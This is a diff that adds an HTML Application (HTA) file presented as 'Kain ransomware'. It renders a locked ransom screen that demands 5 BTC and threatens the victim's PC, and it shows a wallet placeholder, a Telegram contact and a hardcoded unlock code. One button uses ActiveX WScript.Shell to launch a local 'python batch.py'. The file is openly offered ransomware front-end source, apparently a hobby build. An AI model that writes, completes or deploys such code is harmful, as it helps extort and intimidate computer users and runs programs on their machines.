@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kain ransomware</title>
+    <HTA:APPLICATION
+        ID="Kain"
+        APPLICATIONNAME="Hphongdev - kainransomeware"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        ICON=""
+        scroll="no"
+        singleinstance="yes"
+        windowstate="normal"
+        caption="yes"
+        border="none"
+        innerborder="no"
+        contextmenu="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        sysmenu="yes"
+        navigable="no"
+        showintaskbar="no"
+    />
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: black;
+            overflow: hidden; 
+        }
+
+        h1 {
+            color: red;
+        }
+
+        h2 {
+            color: white;
+        }
+
+        p {
+            color: red;
+        }
+
+        button {
+            color: white;
+            background-color: red;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: darkred;
+        }
+    </style>
+    <script type="text/javascript">
+        function showBtcWallet() {
+            var messageLabel = document.getElementById("message-label");
+            messageLabel.innerText = "My BTC wallet: 9999999999999999";
+        }
+
+        function runPythonScript() {
+            var objShell = new ActiveXObject("WScript.Shell");
+            objShell.Run("python batch.py", 1, false);
+        }
+
+        function checkCode() {
+            var codeInput = document.getElementById("codeInput").value;
+            if (codeInput === "hphongdev") {
+                window.close();
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Kain ransomware</h1>
+    <h2>Do not try to exit, you cannot haha! Send me 5 BTC to unlock your device within a week, or else your PC will be dead.</h2>
+    <p id="message-label">You have been hacked! All your files have been decrypted.</p>
+    <button onclick="showBtcWallet()">My BTC Wallet</button>
+    <button onclick="runPythonScript()">Check your info</button>
+    <div>
+        <h2>Contact Telegram: @vilgaxinjector</h2>
+        <h2>Insert the code after sending 5 BTC to me here:</h2>
+        <input type="text" id="codeInput">
+        <div>
+        <button onclick="checkCode()">SUBMIT</button>
+    </div>
+</body>
+</html>
